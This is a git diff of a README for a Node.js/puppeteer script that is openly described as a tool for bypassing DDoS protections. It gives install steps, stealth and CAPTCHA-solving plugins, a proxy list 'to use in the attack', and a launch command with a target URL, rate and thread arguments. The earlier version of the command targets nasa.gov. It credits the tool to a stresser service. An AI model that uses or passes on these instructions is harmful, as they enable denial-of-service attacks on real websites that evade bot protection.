@@ -1,21 +1,26 @@
-# http-browser-v2
-New Version of HTTP Browser
+## New Version of HTTP Browser
 
+This is a new version of the HTTP browser script that can be used to bypass DDoS protections
 
+### Installation
+
+Before you can use the script, you'll need to install Node.js on your system
+
+```shell
 curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
-
 sudo apt -y install nodejs
-
 npm install puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth
-
 apt install chromium-browser -y
+```
 
-chmod 777 optls
+### Usage
 
-node golang_engine.js https://nasa.gov proxy.txt 1200 20 GET 64
+node golang_engine.js https://website.com proxy.txt 1200 20 GET 64
 
-Change the 2captcha key on golang_engine
+The `proxy.txt` file should contain a list of HTTP proxies to use in the attack
 
-Method coded by Ch2k1t3 friend for StresserUS, released because we got hacked
+Note that you'll also need to change the 2captcha key in the `golang_engine.js` file to your own API key.
 
-Dont bully the code, the method was under development
+### Disclaimer
+
+This script was created by Ch2k1t3 for StresserUS
